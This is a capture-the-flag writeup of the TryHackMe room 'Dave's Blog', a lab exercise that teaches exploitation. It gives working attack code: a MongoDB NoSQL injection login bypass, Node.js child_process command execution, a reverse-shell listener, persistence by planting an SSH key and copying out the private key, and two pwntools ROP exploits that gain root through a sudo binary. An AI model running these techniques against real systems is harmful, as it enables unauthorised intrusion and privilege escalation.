---
title: "TryHackMe: Dave's Blog Writeup"
date: 2020-10-16 10:28:00 +02:00
tags: [ "TryHackMe", "Writeup", "Pentest", "pwn", "Node", "Linux", "binary exploitation" ]
description: "Good news! Dave has a new blog. Although why he made it so vulnerable is beyond me."
images: [ "/images/thm/dave/card.png" ]
---

[Dave's Blog](https://tryhackme.com/room/davesblog) is a room over at [TryHackMe](https://tryhackme.com/) with a hard difficulty rating. Dave is ready to show his blog to the world, but he forgot to properly secure his super secret admin panel. After some NoSQL injection to bypass the admin login page, we're able to send off code that is executed by a Node.JS runtime hosted on the server. The final step to root involves exploiting a binary in one of many possible ways thanks to return-oriented programming.

<!--more-->

### Enumeration

A port scan reveals three targets: an open SSH port, a nginx server running on port 80 and an Express server on port 3000. The website on port 80 shows a blog entry by none other than the man himself. He talks about his excitement to kickstart his blog and his fondness of NoSQL databases.

{{< figure src="/images/thm/dave/dave-blog.png" caption="Dave surely seems ecstatic about his database choice" alt="Screenshot of Dave's blog" >}}

Nmap reveals another path on the server called `admin` which shows a login panel. The site comes with some embedded JavaScript that hints at how authentication might be handled. Dave spoke about NoSQL so my first guess was that he might be storing in a [MongoDB](https://www.mongodb.com/) instance.

{{< figure src="/images/thm/dave/admin-login.png" caption="I tried to register but Dave wouldn't let me" alt="Screenshot of the admin login form" >}}

### Blind faith

MongoDB is susceptible to NoSQL injection if inputs from users are blindly trusted. There is a vast array of [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads) available for MongoDB and I opted for the one that had already worked out for me on another machine similar to this one. Basically, for every field you want to query, you can define special properties that perform logical operations as opposed to exact matches. The payload that I chose tries to match with any field whose content is greater than ... nothing, an empty string. It'll match with any user record stored in the database should the server not sanitize inputs properly. I copied the embedded script, adjusted it and pasted the following into the browser console and was promptly redirected.

```js
fetch('', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        username: { "$gt": "" }, 
        password: { "$gt": "" }
    })
}).then(() => {
    location.reload();
})
```

I noticed that the website stored a cookie in my browser. The cookie's name is `jwt` and its format made it clear to me that this is a JSON web token. This one can be easily decoded to yield the first flag out of many.

{{< figure src="/images/thm/dave/jwt-decode.png" caption="Decoding JWT on [jwt.io](https://jwt.io/), pixelated so you still have something to do" alt="Decoding a JSON web token on jwt.io" >}}

After successfully logging in, I was forwarded to a text area with a button next to it labelled "exec" and a greyed out area beneath. I knew I could probably execute code in there, and since the website was built using Express, I assumed I could enter JavaScript to execute it in a Node.JS runtime behind the scenes. A bit of fiddling led me to use a self-executing function.

```js
// this makes foobar appear in the output panel
(() => { return "foobar"; })();
```

Anything that I return within the function will be shown in the output panel. And since Node.JS is being used to execute the code that I enter, I can import its standard modules. The `child_process` module allows me to spawn processes on the host and to return the results back to me. My first experiment was to just call `echo` and it worked just fine.

```js
// the timeout is to kill processes that take too long to finish
(() => { return require("child_process").execSync("echo test;", { timeout: 5000 }); })();
```

{{< figure src="/images/thm/dave/admin-hello.png" caption="One of the few servers to say hello back to me" alt="Using the admin panel to execute echo on the server" >}}

My next step was to execute a Bash reverse shell on the host. I grabbed a payload from Pentestmonkey and set up a listener on my local machine. I dispatched the payload and I found myself in Dave's account. The next flag can be found in his home directory.

```text
kali@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [###.###.###.###] from (UNKNOWN) [###.###.###.###] 57846
/bin/sh: 0: can't access tty; job control turned off
$ id; pwd;
uid=1000(dave) gid=1000(dave) groups=1000(dave)
/home/dave/blog
$ cd    
$ ls -al
total 44
drwxr-xr-x  5 dave dave 4096 May 22 13:32 .
drwxr-xr-x  3 root root 4096 May 21 20:27 ..
lrwxrwxrwx  1 dave dave    9 May 21 20:29 .bash_history -> /dev/null
-rw-r--r--  1 dave dave  220 May 21 20:27 .bash_logout
-rw-r--r--  1 dave dave 3771 May 21 20:27 .bashrc
drwxr-xr-x  9 dave dave 4096 Oct 15 16:26 blog
drwxrwxr-x  3 dave dave 4096 May 21 20:38 .local
drwxrwxr-x 94 dave dave 4096 May 21 20:34 .npm
-rw-r--r--  1 dave dave  807 May 21 20:27 .profile
-rw-rw-r--  1 dave dave   66 May 21 20:38 .selected_editor
-rwxr-xr-x  1 root root  137 May 22 13:32 startup.sh
-rw-rw-r--  1 dave dave   38 May 21 20:45 user.txt
$ cat user.txt
THM{################################}
```

### A command that asks for trouble

It didn't take me long to find my path to the root user. Simply typing in `sudo -l` made it clear where I was headed next: a binary in the root of the file system called `uid_checker`.

```text
$ sudo -l
Matching Defaults entries for dave on daves-blog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on daves-blog:
    (root) NOPASSWD: /uid_checker
```

There was another flag waiting to be found though. Since the server was running a MongoDB instance, I wanted to check if there was anything else of value hidden in there. And sure enough, by connecting to the `daves-blog` database I was able to find a document collection with a very inviting name. Third flag acquired.

```text
$ mongo
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
For interactive help, type "help".
> show dbs
admin       0.000GB
config      0.000GB
daves-blog  0.000GB
local       0.000GB
> use daves-blog
switched to db daves-blog
> show collections
posts
users
whatcouldthisbes
> db.whatcouldthisbes.find()
{ "_id" : ObjectId("5ec6e5cf1dc4d364bf864108"), "whatCouldThisBe" : "THM{################################}", "__v" : 0 }
```

After that, I swiftly made my way to the ominous binary file and executed it to see what it was about. The "UID checker" shows either the user's UID or GID, depending on whether they enter 1 or 2 when prompted for an input. My gut instinct told me that this could probably be exploited, so I transferred the binary over to my local machine to examine it a little bit closer.

```text
$ ./uid_checker
Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
1
Your UID is: 1000
```

### ROP to root

I first loaded the binary into Ghidra to see what it does under the surface. Before I located the `main` function, I ran a quick string search and found the fourth flag. Quick and simple.

{{< figure src="/images/thm/dave/binary-str.png" caption="The oldest trick in any reverse engineering book" alt="Flag found as a string within the binary" >}}

I noticed that the `main` function is using `gets` to read strings from the standard input. If there's anything you should know about `gets`, then it is to never ever use it because it is easily susceptible to malicious inputs. Here, the input is read into a 72-byte long array. This is just begging to have a large input thrown at it.

```c
void main(void)
{
    // code shortened for brevity
    char arg0 [72];

    puts("Welcome to the UID checker!\nEnter 1 to check your UID or enter 2 to check your GID");
    gets(arg0);
    // lots more stuff down here
}
```

Not only that, but there's also a function named `secret` in the binary which is never called. When executed, it pops a shell, and since I can prepend `sudo` on the command line, it'll be a root shell. So the goal is clear: craft some malicious input to somehow get a root shell.

I then ran the binary using GDB. The outputs are quite large since I'm using [pwndgb](https://github.com/pwndbg/pwndbg) which outputs a lot of extra info. I shortened some snippets you're about to see. First off, I had to find out just how much input I need to be able to write values onto the call stack.

```text
pwndbg> r < <(cyclic 100)
Starting program: /home/kali/THM/dave/uid_checker < <(cyclic 100)
Welcome to the UID checker!               
Enter 1 to check your UID or enter 2 to check your GID
Invalid choice

Program received signal SIGSEGV, Segmentation fault.
0x000000000040079d in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────
 RAX  0xf
 RBX  0x0
 RCX  0x7ffff7eddff3 (write+19) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7ffff7fb0670 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x6022a0 ◂— 'Invalid choice\nk your UID or enter 2 to check your GID\n'
 R8   0xf
 R9   0x7ffff7f2e9d0 (__memcpy_ssse3+9680) ◂— mov    rcx, qword ptr [rsi - 0xe]
 R10  0xfffffffffffff40c
 R11  0x246
 R12  0x4005c0 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x6161617661616175 ('uaaavaaa')
 RSP  0x7fffffffdf38 ◂— 'waaaxaaayaaa'
 RIP  0x40079d (main+215) ◂— ret
```

As can be seen in `rsp`, the last value on the stack before the program broke was `waaa`. I fed it back into [pwntools](https://github.com/Gallopsled/pwntools) to find out how many characters I need to force my input onto the stack.

```text
kali@kali:~$ cyclic -l waaa
88
```

However, there's one more thing to mention before I talk about the exploit that I used. Some security features are enabled for this binary. And by "some", I mean executable stack protection (NX). This means I can't just put my own code onto the stack and expect it to work. Fortunately, there's no ASLR and no stack canary enabled, so this makes exploit development a little easier.

```text
pwndbg> checksec
[*] '/home/kali/THM/dave/uid_checker'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**Disclaimer.** I didn't have a good grasp on return-oriented programming when I first worked on this challenge. I checked existing writeups, tried to do my research to understand how they work and then went about attempting it myself. For anyone who shares a similar fate, I can only recommend LiveOverflow's video [Introducing Weird Machines: ROP Differently Explaining](https://www.youtube.com/watch?v=8Dcj19KGKWM) to understand how ROP "feels". Also, big shoutouts to @ryaagard on the TryHackMe Discord server for giving me feedback on my understanding of the exploit.

I'm going to try my best to explain two different exploits: the one that I tried to understand and the one that I came up with that ended up being a lot easier than I initially thought.

### Pop, pop and then some magic

You may have already seen this exploit if you checked out any of the other existing writeups. I'm going to let the code sink in and then pull it apart to show what makes it work.

```py
from pwn import *

cyclic_len = 88

payload = cyclic(cyclic_len)

payload += p64(0x400803)    # pop rdi; ret;
payload += p64(0x601000)    # .bss
payload += p64(0x4005b0)    # gets()
payload += p64(0x400803)    # pop rdi; ret;
payload += p64(0x601000)    # .bss
payload += p64(0x400570)    # system()

s = ssh(host='dave.thm', user='dave', keyfile='./id_rsa')
p = s.process([ "sudo", "/uid_checker"])
# Wait for first input
p.recv()
p.sendline(payload)
# Wait for gets() in rop chain
p.recv()
p.sendline("/bin/sh")
# enter shell
p.interactive()
```

On the surface, this exploit overwrites the call stack so when the main function returns, it looks up the next address on the stack which I now have control over. First, it pops a memory address that points to the binary's bss section off the stack and into the `rdi` register. The following call to `gets` is where the string `/bin/sh` is sent to standard input. I chose the bss memory address arbitrarily since I only need to make sure it points to a bit of memory that I can read to and write from. This can be verified with the binary's virtual memory map.

```text
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /home/kali/THM/dave/uid_checker
          0x600000           0x601000 r--p     1000 0      /home/kali/THM/dave/uid_checker
          0x601000           0x602000 rw-p     1000 1000   /home/kali/THM/dave/uid_checker
```


After that, it loads the same address into `rdi` again to call `system` later. `system` loads its argument from the content of the `rdi` register which was just set to `/bin/sh`, thereby granting access to a privileged shell.

There is a neat trick that I didn't know about until very late into my research. The opcode for `pop r15` is `41 5f` whereas the opcode for `pop rdi` is `5f`. `pop rdi` is a gadget to pop the next address on the stack into the `rdi` register. `rdi` usually points to some memory which acts as a destination for string-based operations like `gets`.

Knowing what the opcodes look like, it's easy to turn a `pop r15` into a `pop rdi` by just incrementing the memory address by one byte. In the binary, you'll find that the instructions located at `0x400802` are actually `pop r15 ret`. If I instead point execution to `0x400803`, I get a `pop rdi ret`.

In order to use the exploit remotely, I had to create an SSH key on Dave's account, attach the public key to his `authorized_keys` file and send the identity file to my local machine. For this to work, you might have to upgrade your reverse shell.

```text
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/dave/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Created directory '/home/dave/.ssh'.
Your identification has been saved in /home/dave/.ssh/id_rsa.
Your public key has been saved in /home/dave/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:JQyWdFWJ3/7cGSTkXI5ePu0zUc17+JON9qlrF+WtbPY dave@daves-blog
The key's randomart image is:                           
+---[RSA 2048]----+
|     .+....o..   |
|     ..+  . .. . | 
|        o ..+.+..|
|         o  .=.+=|
|        S   ..=o*|
|             .oB=|
|             . B@|
|             .BBO|
|            .*++E|
+----[SHA256]-----+
$ cd .ssh
$ cat id_rsa.pub > authorized_keys
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ scp id_rsa kali@###.###.###.###:~
scp id_rsa kali@###.###.###.###:~ 
The authenticity of host '###.###.###.### (###.###.###.###)' can't be established.
ECDSA key fingerprint is SHA256:###########################################.
Are you sure you want to continue connecting (yes/no)?

Warning: Permanently added '###.###.###.###' (ECDSA) to the list of known hosts.
kali@###.###.###.###'s password:

id_rsa                                        100% 1675    31.5KB/s   00:00
```

I executed the script and finally found myself in a root shell on the remote host. The final flag is located in the root home directory.

```text
kali@kali:~/THM/dave$ python3 rop.py
[+] Connecting to dave.thm on port 22: Done
[*] dave@dave.thm:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process 'sudo' on dave.thm: pid 2302
[*] Switching to interactive mode
Enter 1 to check your UID or enter 2 to check your GID
Invalid choice
# $ id; pwd;
uid=0(root) gid=0(root) groups=0(root)
/home/dave
# $ cd /root
# $ ls -al
total 48
drwx------  6 root root 4096 May 22 13:32 .
drwxr-xr-x 24 root root 4096 May 21 20:28 ..
lrwxrwxrwx  1 root root    9 May 21 20:30 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 May 21 20:26 .cache
-rw-------  1 root root  161 May 21 20:48 .dbshell
drwx------  3 root root 4096 May 21 20:26 .gnupg
drwxr-xr-x  3 root root 4096 May 21 20:26 .local
lrwxrwxrwx  1 root root    9 May 21 20:46 .mongorc.js -> /dev/null
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   38 May 21 20:57 root.txt
-rw-r--r--  1 root root   66 May 21 20:44 .selected_editor
-rw-r--r--  1 root root   87 May 22 13:31 setup.sh
drwx------  2 root root 4096 May 21 17:48 .ssh
# $ cat root.txt
THM{################################}
```

### Hidden in plain sight

I mentioned a second solution which I came up with while fiddling with different ROP chains. Prepare yourself, because I was wondering how I didn't come up with this in the first place.

```py
from pwn import *

cyclic_len = 88

payload = cyclic(cyclic_len)

payload += p64(0x4006b7)    # lea rdi *"/bin/sh"; system();

s = ssh(host='dave.thm', user='dave', keyfile='./id_rsa')
p = s.process([ "sudo", "/uid_checker"])
# Wait for input
p.recv()
p.sendline(payload)
# enter shell
p.interactive()
```

Inside the `secret` function, there's a `lea rdi` instruction right before the call to `system`. It loads the address of the `/bin/sh` string contained within the binary into `rdi`. Makes sense since if I were to use `system("/bin/sh")` in my code, the compiler would have to load the string into a register where the `system` function can easily find it. That just so happens to be the `rdi` register. This one can be executed the exact same way as the other exploit, just with fewer lines of code. You can find this and the other exploit in my [CTF snippet repository](https://github.com/JoogsWasTaken/ctf-snippets/tree/master/THM/Dave).

### Conclusion

This machine finally forced me to learn about ROP and I loved it. It's hard to wrap your head around but it makes a lot of sense, and there's still lots of ground for me to cover. Other than that, this machine was fairly straightforward. The last part definitely took me the longest. Thanks to [jammy](https://tryhackme.com/p/jammy) for this room.